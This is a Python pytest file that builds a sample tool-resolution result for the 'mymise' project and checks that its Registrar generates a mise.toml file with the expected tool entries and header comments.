from datetime import datetime

import pytest

from src.mymise.models import (
    BackendType,
    DiscoveredTool,
    ResolutionResult,
    ResolvedTool,
    ToolCategory,
    ToolSource,
    UnresolvedTool,
)
from src.mymise.registrar import Registrar


@pytest.fixture
def sample_resolution_result():
    discovered_node = DiscoveredTool(
        name="node", sources=[ToolSource.PATH], installed_by=[ToolSource.MISE], category=ToolCategory.RUNTIME
    )
    discovered_gh = DiscoveredTool(name="gh", sources=[ToolSource.PATH], installed_by=[ToolSource.APT])
    discovered_custom = DiscoveredTool(name="custom-tool", sources=[ToolSource.PATH], installed_by=[ToolSource.CARGO])

    resolved = [
        ResolvedTool(
            name="node",
            backend=BackendType.ASDF,
            registry_entry="asdf:nodejs",
            install_command="mise use -g nodejs@latest",
            original=discovered_node,
        )
    ]
    unresolved = [
        # GitHub provenance case
        UnresolvedTool(name="gh", original=discovered_gh, suggested_actions=["Check github:cli/cli"]),
        # Fallback case
        UnresolvedTool(name="custom-tool", original=discovered_custom, suggested_actions=["cargo install custom-tool"]),
    ]

    return ResolutionResult(
        resolution_timestamp=datetime(2026, 4, 12, 12, 0, 0),
        resolved=resolved,
        unresolved=unresolved,
        resolution_rate=0.33,
    )


def test_registrar_generates_mise_toml(sample_resolution_result, tmp_path):
    registrar = Registrar(sample_resolution_result, output_dir=tmp_path)
    registrar.generate_artifacts()

    mise_toml_path = tmp_path / "mise.toml"
    assert mise_toml_path.exists()
    content = mise_toml_path.read_text()
    assert "[tools]" in content
    assert 'node = "latest"' in content
    assert "# Source: asdf" in content
    assert "# Generated by mymise" in content
    # Verify timestamp is present (don't hardcode date)
    assert "# Timestamp: 202" in content


